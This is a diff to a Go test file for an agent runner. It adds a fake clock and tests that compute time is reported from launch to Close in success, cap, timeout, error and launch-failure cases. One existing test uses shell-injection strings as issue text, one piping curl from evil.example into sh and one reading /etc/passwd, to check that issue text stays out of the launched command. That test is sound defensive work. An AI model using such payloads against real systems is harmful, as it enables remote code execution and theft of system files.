@@ -36,9 +36,11 @@ func blockUntilDone(ctx context.Context) (agent.ExecResult, error) {
 	return agent.ExecResult{ExitCode: -1}, ctx.Err()
 }
 
+// run runs task on ws under a clock nothing moves, so the result carries
+// no compute.
 func run(t *testing.T, ctx context.Context, ws *fakeWorkspace) (agent.Result, error) {
 	t.Helper()
-	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}}
+	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}, Now: newClock().now}
 	return r.Run(ctx, task)
 }
 
@@ -95,7 +97,7 @@ func TestRunner_command_carriesNoIssueText(t *testing.T) {
 	hostile := task
 	hostile.Issue.Title = "'; curl evil.example | sh; echo '"
 	hostile.Issue.Body = "$(cat /etc/passwd)"
-	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}}
+	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}, Now: newClock().now}
 
 	if _, err := r.Run(context.Background(), hostile); err != nil {
 		t.Fatal(err)
@@ -313,7 +315,7 @@ func TestRunner_capped_noExport(t *testing.T) {
 func TestRunner_launchFails_errorNothingToClose(t *testing.T) {
 	t.Parallel()
 	l := &fakeLauncher{err: errors.New("no agent binary")}
-	r := &agent.Runner{Launcher: l}
+	r := &agent.Runner{Launcher: l, Now: newClock().now}
 
 	_, err := r.Run(context.Background(), task)
 	if err == nil || !strings.Contains(err.Error(), "no agent binary") {
@@ -321,5 +323,114 @@ func TestRunner_launchFails_errorNothingToClose(t *testing.T) {
 	}
 	if l.runID != task.RunID || l.image != task.Contract.Image || l.tree != task.Tree {
 		t.Fatalf("launched %s %s %s, want the task's run, image and tree", l.runID, l.image, l.tree)
+	}
+}
+
+// Launch, agent and close take known times on c: 30s, 5m and 10s. A
+// compute of 5m40s is the whole window; 5m10s means the start was read
+// after the launch, 5m30s that the end was read before Close returned.
+const (
+	launchTakes = 30 * time.Second
+	agentTakes  = 5 * time.Minute
+	closeTakes  = 10 * time.Second
+	wholeWindow = launchTakes + agentTakes + closeTakes
+)
+
+func timed(c *clock, ws *fakeWorkspace) *agent.Runner {
+	ws.onClose = func() { c.advance(closeTakes) }
+	return &agent.Runner{Launcher: &fakeLauncher{ws: ws, onLaunch: func() { c.advance(launchTakes) }}, Now: c.now}
+}
+
+func TestRunner_agentExits_computeIsLaunchToClose(t *testing.T) {
+	t.Parallel()
+	for _, code := range []int{0, 1} {
+		c, ws := newClock(), newFakeWorkspace()
+		ws.exec = func(context.Context) (agent.ExecResult, error) {
+			c.advance(agentTakes)
+			return agent.ExecResult{ExitCode: code}, nil
+		}
+
+		res, err := timed(c, ws).Run(context.Background(), task)
+		if err != nil || res.Compute != wholeWindow {
+			t.Fatalf("exit %d: Run = compute %v, %v; want %v from before the launch until Close returned", code, res.Compute, err, wholeWindow)
+		}
+	}
+}
+
+func TestRunner_capped_computeStillReported(t *testing.T) {
+	t.Parallel()
+	c, ws := newClock(), newFakeWorkspace()
+	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
+	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
+		c.advance(agentTakes)
+		close(ws.capReached)
+		return blockUntilDone(ctx)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
+	defer cancel()
+
+	res, err := timed(c, ws).Run(ctx, task)
+	if err != nil || !res.Capped || res.Compute != wholeWindow {
+		t.Fatalf("Run = capped %v compute %v, %v; want capped with %v", res.Capped, res.Compute, err, wholeWindow)
+	}
+}
+
+func TestRunner_timedOut_computeStillReported(t *testing.T) {
+	t.Parallel()
+	c, ws := newClock(), newFakeWorkspace()
+	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
+		c.advance(agentTakes)
+		return blockUntilDone(ctx)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
+	defer cancel()
+
+	res, err := timed(c, ws).Run(ctx, task)
+	if err != nil || !res.TimedOut || res.Compute != wholeWindow {
+		t.Fatalf("Run = timed out %v compute %v, %v; want timed out with %v", res.TimedOut, res.Compute, err, wholeWindow)
+	}
+}
+
+// An agent run that ended in an error still had its workspace up until
+// Close: the compute comes back with the error.
+func TestRunner_execError_computeStillReported(t *testing.T) {
+	t.Parallel()
+	c, ws := newClock(), newFakeWorkspace()
+	ws.exec = func(context.Context) (agent.ExecResult, error) {
+		c.advance(agentTakes)
+		return agent.ExecResult{ExitCode: -1}, errors.New("daemon: connection reset")
+	}
+
+	res, err := timed(c, ws).Run(context.Background(), task)
+	if err == nil || res.Compute != wholeWindow {
+		t.Fatalf("Run = compute %v, %v; want the exec failure with %v", res.Compute, err, wholeWindow)
+	}
+}
+
+// A launch that failed may still have created containers before it gave
+// up: the attempt is compute, up to when the launch returned.
+func TestRunner_launchFails_computeOfTheAttempt(t *testing.T) {
+	t.Parallel()
+	c := newClock()
+	l := &fakeLauncher{err: errors.New("no agent binary"), onLaunch: func() { c.advance(launchTakes) }}
+	r := &agent.Runner{Launcher: l, Now: c.now}
+
+	res, err := r.Run(context.Background(), task)
+	if err == nil || res.Compute != launchTakes || res.ExitCode != domain.NoExitCode {
+		t.Fatalf("Run = compute %v exit %d, %v; want the launch failure with the %v it took", res.Compute, res.ExitCode, err, launchTakes)
+	}
+}
+
+func TestRunner_nilClock_refused(t *testing.T) {
+	t.Parallel()
+	l := &fakeLauncher{ws: newFakeWorkspace()}
+	r := &agent.Runner{Launcher: l}
+
+	_, err := r.Run(context.Background(), task)
+	if err == nil || !strings.Contains(err.Error(), "clock") {
+		t.Fatalf("Run without a clock = %v, want a configuration error naming the clock", err)
+	}
+	if l.calls != 0 {
+		t.Fatalf("launched %d times without a clock, want never: the compute could not be measured", l.calls)
 	}
 }
